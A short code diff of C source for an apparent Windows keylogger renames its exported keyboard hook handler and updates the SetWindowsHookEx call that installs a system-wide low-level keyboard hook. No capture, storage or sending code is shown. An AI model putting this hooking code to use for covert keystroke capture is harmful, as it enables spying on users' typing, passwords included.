@@ -36,7 +36,7 @@ HHOOK hKeyHook;
 // execuatable like any function is exported from a 
 // DLL. It is the hook handler routine for low level 
 // keyboard events. 
-__declspec(dllexport) LRESULT CALLBACK KeyEvent ( 
+__declspec(dllexport) LRESULT CALLBACK HookEvent ( 
   int nCode,      // The hook code 
   WPARAM wParam,  // The window message (WM_KEYUP, WM_KEYDOWN, etc.) 
   LPARAM lParam   // A pointer to a struct with information about the pressed key 
@@ -118,7 +118,7 @@ DWORD WINAPI KeyLogger(LPVOID lpParameter)
     if (!hExe) return 1; 
     hKeyHook = SetWindowsHookEx (  // install the hook: 
         WH_KEYBOARD_LL,            // as a low level keyboard hook 
-        (HOOKPROC) KeyEvent,       // with the KeyEvent function from this executable 
+        (HOOKPROC) HookEvent,       // with the HookEvent function from this executable 
         hExe,                      // and the module handle to our own executable 
         NULL                       // and finally, the hook should monitor all threads. 
     ); 
